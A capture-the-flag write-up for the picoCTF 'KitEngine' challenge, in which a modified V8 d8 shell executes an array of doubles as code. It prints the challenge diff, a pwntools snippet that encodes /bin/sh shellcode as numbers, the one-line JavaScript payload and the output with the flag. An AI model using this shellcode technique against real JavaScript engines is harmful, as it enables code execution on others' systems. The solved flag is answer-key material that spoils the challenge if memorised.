# KitEngine
Author: wparks

Start your engines!! [d8](https://mercury.picoctf.net/static/6e15c605b9f214d7afc35e68b4ae307f/d8) [source.tar.gz](https://mercury.picoctf.net/static/6e15c605b9f214d7afc35e68b4ae307f/source.tar.gz) [server.py](https://mercury.picoctf.net/static/6e15c605b9f214d7afc35e68b4ae307f/server.py) Connect at mercury.picoctf.net 62123

Hint 1: Having a good foundation may be helpful later

Hint 2: Make sure your shellcode works for the situation.

## Solving tl;dr
```diff
+uint64_t doubleToUint64_t(double d){
+  union {
+    double d;
+    uint64_t u;
+  } conv = { .d = d };
+  return conv.u;
+}
+
+void Shell::Breakpoint(const v8::FunctionCallbackInfo<v8::Value>& args) {
+  __asm__("int3");
+}
+
+void Shell::AssembleEngine(const v8::FunctionCallbackInfo<v8::Value>& args) {
+  Isolate* isolate = args.GetIsolate();
+  if(args.Length() != 1) {
+    return;
+  }
+
+  double *func = (double *)mmap(NULL, 4096, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+  if (func == (double *)-1) {
+    printf("Unable to allocate memory. Contact admin\n");
+    return;
+  }
+
+  if (args[0]->IsArray()) {
+    Local<Array> arr = args[0].As<Array>();
+
+    Local<Value> element;
+    for (uint32_t i = 0; i < arr->Length(); i++) {
+      if (arr->Get(isolate->GetCurrentContext(), i).ToLocal(&element) && element->IsNumber()) {
+        Local<Number> val = element.As<Number>();
+        func[i] = val->Value();
+      }
+    }
+
+    printf("Memory Dump. Watch your endianness!!:\n");
+    for (uint32_t i = 0; i < arr->Length(); i++) {
+      printf("%d: float %f hex %lx\n", i, func[i], doubleToUint64_t(func[i]));
+    }
+
+    printf("Starting your engine!!\n");
+    void (*foo)() = (void(*)())func;
+    foo();
+  }
+  printf("Done\n");
+}
+
```

This challenge introduces a new function, `AssembleEngine()`, that will take a single array of Numbers (doubles) and execute the data as shellcode.

There's really not much to say here. I start by getting /bin/sh shellcode from pwntools:

```python
from pwnscripts import *
context.arch = 'amd64'
print(','.join('%dn'%v for v in map(unpack,group(8, sh(), 'fill', b'\0'))))
```
The end result is `7593684403119126065n,6869207039721025390n,5562984099575n`, and that's all you need to send to `AssembleEngine()`:
```js
AssembleEngine([7593684403119126065n,6869207039721025390n,5562984099575n].map(v=>itof(v)));
```
That's it.
```python
File written. Running. Timeout is 20s
$ cat flag.txt
$ exit
Run Complete
Stdout b'picoCTF{vr00m_vr00m_30abad0d522d3b14}\n'
Stderr b''
[*] Got EOF while reading in interactive
$
```
